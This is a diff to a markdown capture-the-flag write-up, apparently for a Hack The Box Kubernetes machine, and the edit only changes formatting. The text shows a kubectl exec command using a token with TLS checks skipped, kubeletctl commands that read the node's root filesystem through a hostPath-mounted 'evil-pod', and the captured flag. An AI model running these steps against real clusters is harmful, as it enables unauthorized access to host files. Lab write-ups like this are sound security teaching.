@@ -52,12 +52,12 @@ spec:
 
 Our pod was successfully deployed and running, then we had back the our `kubeletclt` command to execute some commands on our pod, of course we tried to execute a shell on the pod but no luck:
 
-**`kubectl  --insecure-skip-tls-verify=true --server="[https://$](https://%24/){IP_ADDRESS}:8443" \
+`kubectl  --insecure-skip-tls-verify=true --server="[https://$](https://%24/){IP_ADDRESS}:8443" \
 --token="${TOKEN}" \
-exec -it evil-pod --namespace=default -- /bin/sh` .**
+exec -it evil-pod --namespace=default -- /bin/sh`.
 
 The `kubeletctl -s 10.129.96.98 exec "ls -la /host" -p evil-pod -c evil-container`  command is to check that our hostPath was successfully mount on the node, and is was.
 
 Then `kubeletctl -s 10.129.96.98 exec "ls -la /host/root/flag.txt" -p evil-pod -c evil-container` to cat the flag.
 
-**HTB{d0n7_3Xpo53_Ku83L37}.**
+**HTB{d0n7_3Xpo53_Ku83L37}.
